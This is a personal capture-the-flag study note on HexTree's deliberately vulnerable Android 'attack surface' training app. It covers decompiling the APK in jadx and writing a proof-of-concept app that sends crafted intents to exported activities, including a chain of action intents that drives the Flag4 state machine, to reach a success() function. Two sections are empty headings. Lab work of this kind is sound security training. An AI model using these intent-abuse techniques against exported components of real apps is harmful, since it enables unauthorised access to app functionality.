
2025-06-09 10:57

Source: #android 
# Activity  

Take the apk in jadx and check the android manifest to find activities related to flag
click on the flag activity and we see a call to success() function 
our goal is to reach the success() function in all of these challenges
#### 1 - basic exported activity

 note the package name and complete class name 

write this java code in your POC app
```java
public void onClick(View view) {  
    Intent intent = new Intent();  
    intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity");  
    startActivity(intent);  
}
```
#### 2 - intent w extras

#### 3 - Intent w data URI

#### 4 - State machine 

when looking at the flag4activity code in jadx we see multiple actions nested in `if` loops - like so
```java
if (ordinal != 0) {
     if (ordinal != 1) {
        if (ordinal != 2) {
            if (ordinal == 3) {
                this.f.addTag(State.GET_FLAG);
                setCurrentState(State.INIT);
                success(this);
                Log.i("Flag4StateMachine", "solved");
                return;
            }
	        ...
        } else if ("GET_FLAG_ACTION".equals(action)) { ....
            Log.i("Flag4StateMachine", "Transitioned from BUILD to GET_FLAG");
            return;
        }
    } else if ("BUILD_ACTION".equals(action)) {
        ...
		... // more else if loops 
```

This hints that we might have to make multiple intents for every action 

```java
Intent exploitIntent3 = new Intent();  
exploitIntent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");  
exploitIntent3.setAction("GET_FLAG_ACTION");  
startActivity(exploitIntent3);  
  
Intent exploitIntent2 = new Intent();  
exploitIntent2.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");  
exploitIntent2.setAction("BUILD_ACTION");  
startActivity(exploitIntent2);  
  
Intent exploitIntent = new Intent();  
exploitIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");  
exploitIntent.setAction("PREPARE_ACTION");  
startActivity(exploitIntent);
```

### References
https://www.youtube.com/watch?v=jnBmI1eD-og
https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/